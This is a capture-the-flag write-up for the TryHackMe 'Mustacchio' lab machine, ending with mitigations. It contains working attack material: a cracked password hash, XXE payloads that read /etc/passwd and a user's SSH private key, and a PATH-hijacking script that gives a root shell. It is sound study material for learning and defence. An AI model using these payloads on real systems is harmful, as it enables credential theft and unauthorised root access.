# Mustacchio Tryhackme CTF - Writeup

## Target Information

* IP Address: 10.65.171.253
* Operating System: Ubuntu Linux
* Difficulty: Easy
* Machin link :[https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)

***

{% stepper %}
{% step %}
### Recon & Enumeration

#### I use Nmap as port scanner

Command used:

```bash
nmap -sC -sV -p- 10.65.171.253
```

Open ports & services:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 7.2p2 |
| 80   | HTTP    | Apache 2.4.18 |
| 8765 | HTTP    | Nginx 1.10.3  |

Observation:

* Two different web servers (Apache & Nginx) running on the same host — often indicates separated services or different application logic.
{% endstep %}

{% step %}
### Web Enumeration – Port 80 (Apache)

* Website title: Mustacchio | Home
* robots.txt exists but contains no useful paths.

Using ffuf a backup file was discovered:

* /users.bak

Inspecting the file revealed database-related data, including a username and password hash:

```
admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```
{% endstep %}

{% step %}
### Hash Cracking

* Hash length: 40 characters → identified as SHA1

Command used with Hashcat:

```bash
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered password:

* bulldog19
{% endstep %}

{% step %}
### Admin Panel – Port 8765 (Nginx)

* Logged into the admin panel using: admin / bulldog19

Inside the source code, the following comment was found:

```html
<!-- Barry, you can now SSH in using your key! -->
```

This confirms:

* SSH access is restricted to key-based authentication
* Password login is disabled
{% endstep %}

{% step %}
### XXE Injection – Initial Access

The admin panel accepts XML input and was vulnerable to XML External Entity (XXE) injection.

Proof of XXE (Local File Disclosure):

{% code title="" %}
```
xxe /etc/passwd
```
{% endcode %}

```xml
<?xml version="1.0"?>

<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<comment>
  <name>test</name>
  <author>test</author>
  <com>&xxe;</com>
</comment>
```

Sensitive system data was returned, confirming the vulnerability.

Targeted Barry’s SSH private key:

{% code title="xxe /home/barry/.ssh/id_rsa" %}
```vb
xxe /home/barry/.ssh/id_rsa
```
{% endcode %}

```xml
<?xml version="1.0"?>

<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">
]>

<comment>
  <name>admin</name>
  <author>admin</author>
  <com>&xxe;</com>
</comment>
```

The private key was successfully disclosed.
{% endstep %}

{% step %}
### SSH Access

* The private key was protected with a passphrase.
* The passphrase was cracked using John the Ripper.

SSH command used:

```bash
ssh -i id_rsa barry@10.65.171.253
```

Initial foothold achieved.
{% endstep %}

{% step %}
### Privilege Escalation

Searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Interesting binary found:

* /home/joe/live\_log

Binary analysis:

* Owned by root
* SUID bit set
*   The binary uses system() to execute:

    ```
    tail -f /var/log/nginx/access.log
    ```
* tail is called without an absolute path → leads to PATH hijacking vulnerability.
{% endstep %}

{% step %}
### PATH Hijacking Exploitation

Steps performed on the target:

Create a malicious tail binary:

```bash
cd /tmp
echo -e '#!/bin/bash\n/bin/bash -p' > tail
chmod +x tail
```

Modify PATH to include /tmp first:

```bash
export PATH=/tmp:$PATH
```

Execute the SUID binary:

```bash
/home/joe/live_log
```

Result: Root shell obtained.

HERE WE GOO YESS !!! we are th SYS OWNER

&#x20;
{% endstep %}

{% step %}
### xd

<figure><img src=".gitbook/assets/hack-vibe.jfif" alt=""><figcaption></figcaption></figure>
{% endstep %}
{% endstepper %}

***

## Key Takeaways

* Vulnerabilities identified:
  * Exposed backup files (.bak)
  * Weak password hashing (SHA1)
  * XML External Entity (XXE)
  * Improper SUID binary configuration
  * PATH Hijacking

{% hint style="info" %}
This machine highlights how small misconfigurations chained together can lead to full system compromise: information disclosure → XXE → SSH key extraction → privilege escalation.
{% endhint %}

## Mitigations (Real‑World)

* Disable external entities in XML parsers.
* Never expose backup or sensitive files.
* Use strong password hashing (bcrypt / argon2).
* Avoid custom SUID binaries.
* Always use absolute paths in privileged programs.

## Final Notes

Each step in this chain relied on poor security practices rather than complex exploits.
